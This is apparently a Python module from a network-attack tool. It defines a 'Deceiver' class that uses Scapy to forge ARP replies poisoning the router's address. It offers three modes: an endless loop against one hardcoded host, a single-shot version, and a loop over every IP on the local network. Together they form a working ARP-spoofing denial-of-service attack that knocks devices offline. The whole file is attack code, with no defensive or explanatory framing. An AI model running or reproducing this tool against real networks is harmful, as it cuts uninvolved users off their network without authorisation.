import time

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp
from .scanner import Scanners


class Deceiver:
    def __init__(self, logger):
        self.logger = logger
        self.logger.info("Deceiver module initialized!")

    def arp_kill(self, target_ip):
        arppkt = Ether() / ARP()
        arppkt[ARP].hwsrc = "00:11:22:33:44:55"  # our MAC
        arppkt[ARP].psrc = "192.168.2.1"  # router IP
        arppkt[ARP].pdst = "192.168.2.130"  # Ziel ip
        arppkt[ARP].op = 2

        #arppkt2 = Ether() / ARP()
        #arppkt2[ARP].hwsrc = "b4:2e:99:49:1c:f0"
        #arppkt2[ARP].psrc = "192.168.2.130"
        #arppkt2[ARP].pdst = "192.168.2.1"
        #arppkt2[ARP].op = 2

        while True:
            time.sleep(1)
            sendp(arppkt, verbose=0)

    def arp_kill_once(self, target_ip):
        arppkt = Ether() / ARP()
        arppkt[ARP].hwsrc = "00:11:22:33:44:55"  # our MAC
        arppkt[ARP].psrc = "192.168.2.1"  # router IP
        arppkt[ARP].pdst = target_ip  # Ziel ip
        arppkt[ARP].op = 2

        # arppkt2 = Ether() / ARP()
        # arppkt2[ARP].hwsrc = "b4:2e:99:49:1c:f0"
        # arppkt2[ARP].psrc = "192.168.2.130"
        # arppkt2[ARP].pdst = "192.168.2.1"
        # arppkt2[ARP].op = 2

        sendp(arppkt, verbose=0)

    def arp_kill_network(self):
        s = Scanners()
        ips = s.get_all_local_ips()
        while True:
            for ip in ips:
                self.arp_kill_once(ip)
            time.sleep(1)

